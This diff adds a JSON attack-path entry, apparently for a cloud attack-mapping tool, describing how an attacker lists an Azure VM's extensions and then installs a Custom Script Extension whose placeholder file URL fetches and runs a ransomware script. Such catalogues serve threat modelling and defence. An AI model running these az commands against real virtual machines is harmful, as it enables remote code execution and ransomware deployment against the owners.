@@ -1,0 +1,36 @@
+{
+    "title": "Exploit VM Custom Script Extension for Ransomware Deployment",
+    "icon": "https://img.icons8.com/?size=100&id=38248&format=png&color=000000",
+    "nodes": [
+        {
+            "id": 1,
+            "label": "Attacker",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/hacker.png",
+            "details": {}
+        },
+        {
+            "id": 2,
+            "label": "List VM Extensions",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/extension.png",
+            "details": {
+                "command": "az vm extension list --resource-group <ResourceGroupName> --vm-name <VMName>",
+                "description": "Lists all extensions installed on the specified virtual machine.",
+                "services": ["VirtualMachines"],
+                "attack_types": ["Enumeration"],
+                "references": "https://docs.microsoft.com/en-us/cli/azure/vm/extension?view=azure-cli-latest#az-vm-extension-list"
+            }
+        },
+        {
+            "id": 3,
+            "label": "Install Custom Script Extension",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/script.png",
+            "details": {
+                "command": "az vm extension set --resource-group <ResourceGroupName> --vm-name <VMName> --name customScript --publisher Microsoft.Azure.Extensions --settings '{\"fileUris\": [\"<URLToRansomwareScript>\"], \"commandToExecute\": \"<CommandToExecute>\"}'",
+                "description": "Installs a custom script extension to deploy ransomware on the virtual machine.",
+                "services": ["VirtualMachines"],
+                "attack_types": ["Code Execution"],
+                "references": "https://docs.microsoft.com/en-us/cli/azure/vm/extension?view=azure-cli-latest#az-vm-extension-set"
+            }
+        }
+    ]
+}
